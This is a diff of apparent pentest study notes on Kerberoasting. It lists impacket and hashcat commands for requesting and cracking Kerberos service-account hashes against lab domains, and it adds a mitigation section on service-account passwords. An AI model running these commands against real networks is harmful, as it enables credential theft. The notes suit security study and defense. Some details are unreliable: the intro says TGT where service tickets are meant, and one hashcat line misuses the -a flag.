@@ -1,16 +1,27 @@
 Kerberos is a network authentication protocol that allows entities to prove their identity over a non-secure network in a secure way. Kerberoasting is a technique used in penetration testing and security assessments to exploit vulnerabilities in the Kerberos authentication system. The goal is to obtain Kerberos Ticket Granting Ticket (TGT) hashes for service accounts and crack them offline to obtain plaintext passwords.
 
-python GetUserSPNs.py -request -dc-ip 10.0.3.4 MARVEL.local/administrator 
-python GetUserSPNs.py MARVEL.local/fadministrator:Password1 -dc-ip 10.0.3.4 -request
+
+GetUserSPNs.py -request -dc-ip 10.0.3.4 MARVEL.local/administrator 
+GetUserSPNs.py MARVEL.local/administrator:Password1 -dc-ip 10.0.3.4 -request
+GetADUsers.py -all 192.168.57.140
 
 impacket-GetNPUsers -dc-ip 10.10.10.100 active.htb/SVC_TGS -no-pass
 impacket-GetNPUsers -dc-ip 10.10.10.100 active.htb/SVC_TGS:<password>
 
 
-hashcat -m 13100 hash.txt rockyou -O
-hashcat -m 13100 hash.txt -a /usr/share/wordlist/rockyou.txt 
-hashcat -m 18200 hash.txt /usr/share/wordlist/rockyou.txt
+hashcat -m 13100 krb.txt /usr/share/wordlist/rockyou.txt -O
+hashcat -m 13100 krb.txt -a /usr/share/wordlist/rockyou.txt 
+hashcat -m 18200 krb.txt /usr/share/wordlist/rockyou.txt
 
 
 sudo apt install ntpdate
 ntpdate 10.10.10.100
+
+
+-- Kerberoasting Mitigation --
+
+· If possible use group managed service accounts which have random, complex passwords (>100 characters) and are managed automatically by Active Directory
+· Ensure all service accounts (user accounts with Service Principal Names) have long, complex passwords greater than 25 characters, preferably 30 or more. This makes cracking these password far more difficult.
+· Service Accounts with elevated AD permissions should be the focus on ensuring they have long, complex passwords.
+· Ensure all Service Account passwords are changed regularly
+ 
